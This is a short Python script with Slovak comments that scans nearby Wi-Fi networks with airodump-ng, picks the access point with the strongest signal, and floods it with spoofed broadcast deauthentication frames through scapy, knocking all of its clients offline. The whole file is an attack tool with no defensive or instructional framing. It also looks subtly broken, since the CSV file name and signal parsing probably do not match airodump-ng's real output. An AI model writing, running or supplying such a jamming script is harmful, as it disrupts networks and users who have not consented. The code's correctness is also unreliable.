import os
import time
from scapy.all import *

def get_strongest_bssid(interface):
    airodump_output = "airodump_output.csv"
    airodump_command = f"airodump-ng --output-format csv --write {airodump_output} {interface} > /dev/null 2>&1 &"
    os.system(airodump_command)
    time.sleep(5)  # Skenujeme sieť počas 5 sekúnd na získanie informácií

    # Analyzujeme výstup z airodump-ng a vyberieme BSSID s najvyšším signálom
    strongest_bssid = None
    max_signal = -100
    with open(airodump_output, "r") as f:
        for line in f:
            if "Station MAC" in line:
                break
            parts = line.strip().split(",")
            if len(parts) >= 14:
                signal_str = parts[8]
                if signal_str.startswith("-"):
                    signal = int(signal_str)
                    if signal > max_signal:
                        max_signal = signal
                        strongest_bssid = parts[0]

    # Ukončíme airodump-ng
    os.system("pkill airodump-ng")

    return strongest_bssid

def deauth_all_clients(interface):
    target_bssid = get_strongest_bssid(interface)
    if target_bssid:
        packet = RadioTap() / Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
        sendp(packet, iface=interface, count=100, inter=0.1)

if __name__ == "__main__":
    # Uistite sa, že máte správne nastavené rozhranie pre váš WiFi adaptér
    wireless_interface = "wlan0"

    deauth_all_clients(wireless_interface)